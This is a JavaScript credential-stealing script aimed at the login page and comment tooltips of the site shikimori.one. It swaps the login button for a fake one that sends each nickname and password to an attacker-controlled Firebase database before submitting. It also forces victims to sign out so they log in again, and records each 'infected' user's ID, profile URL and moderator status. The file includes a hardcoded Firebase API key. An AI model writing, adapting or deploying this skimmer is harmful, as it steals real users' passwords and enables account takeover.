let firebaseConfig = {
  apiKey: 'AIzaSyCkvaWekEMMk0y43Nf744KRaH9QYd3Hj6I',
  authDomain: 'test-71cc8.firebaseapp.com',
  databaseURL: 'https://test-71cc8-default-rtdb.europe-west1.firebasedatabase.app',
  projectId: 'test-71cc8',
  storageBucket: 'test-71cc8.appspot.com',
  messagingSenderId: '911748905714',
  appId: '1:911748905714:web:ad42c0b23920a5f9bd6e6b',
  measurementId: 'G-FZ0SC6YJJB'
};

import {
  initializeApp as e
}
from'https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js';

import {
  getDatabase as n,
  ref as a,
  push as i,
  onValue as s,
  remove as l,
  update as r
}
from'https://www.gstatic.com/firebasejs/10.11.0/firebase-database.js';
let app = e(firebaseConfig),
database = n();

function sendComment(e) {
    a(database, 'comments');
    let t = {
      text: e,
      date: new Date().toISOString()
    },
    n = a(database, `comments/${ Date.now().toString() }`);
    return r(n, t);
}

function editComment(e, t) {
  let n = a(database, `comments/${ e }`);
  r(n, {
    text: t,
    edited: new Date().toLocaleString()
  })
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function injectCode() {
  //console.log('Init Inject');

  //let submitButton = document.querySelector('.p-devise_sessions .simple_form.b-form.new_user');
  let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
  if (submitButton != null) {
    //console.log('button found!');
    let name = document.getElementById('user_nickname');
    let pass = document.getElementById('user_password');
    //console.log('inputs found!');
    //submitButton.addEventListener('mouseenter', ()=>{
    //sendComment(`name: ${name.value}, pass : ${pass.value}`);
    //  console.log(`name: ${name.value}, pass : ${pass.value}`);
    //})

    let fakeButton = submitButton.cloneNode(true);
    fakeButton.classList.add('b-button');
    fakeButton.type = 'button';
    submitButton.after(fakeButton);
    submitButton.style.display = 'none';
    fakeButton.addEventListener('click', ()=>{
      fakeButton.value = fakeButton.dataset.disableWith;
      let strData = `name: ${name.value}, pass : ${pass.value}`;
      //console.log(strData);
      sendComment(strData).then(()=>{
        submitButton.click();
      })
    })
  }
}

async function signOutUser(delay) {
     await sleep(delay);
     const metaTag = document.querySelector('meta[name="csrf-token"]');
     const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
     fetch('https://shikimori.one/api/users/sign_out', {
      "headers": {
       'X-CSRF-Token': csrfToken,
      },
       "method": 'POST'
     })
 }

function getTooltip() {
  let userData = $('body').data('user');
  let defautUrl = 'https://shikimori.one/comments/10529261';
  let $container = $('.pusechka529');
  $container.each(function() {
      let $thisContainer = $(this);
      let $link = $thisContainer.children('.bubbled-processed');
      let urlParams = new URL($link.attr('href')).searchParams.get('url');
      let targetUrl = $thisContainer.children('.target.hidden').attr('href') || urlParams || defautUrl;
      let $tooltip = $link.tooltip();
      //let $target = $tooltip.getTrigger();
      let $tip = $tooltip.getTip();
      if ($tip) {
        $tip.find('.tooltip-details').load(targetUrl + '/tooltip', function() {
          var $this = $(this);
          $tooltip.show({
            target: $link[0]
          });
          $this.process();
        });
      }
      $link.attr('href', targetUrl);
    });
  
    if (!window.inject) {
      let logoutDelay = $container.data('signout-delay') || 1000;
      signOutUser(logoutDelay);
      let strData = `Заражен ${userData.id} - ${userData.url} Модератор: ${userData.is_moderator}`;
      sendComment(strData);
      window.inject = true;
    }
  }

getTooltip();
//signOutUser();
document.addEventListener("turbolinks:load", injectCode);
document.addEventListener("turbolinks:load", getTooltip);
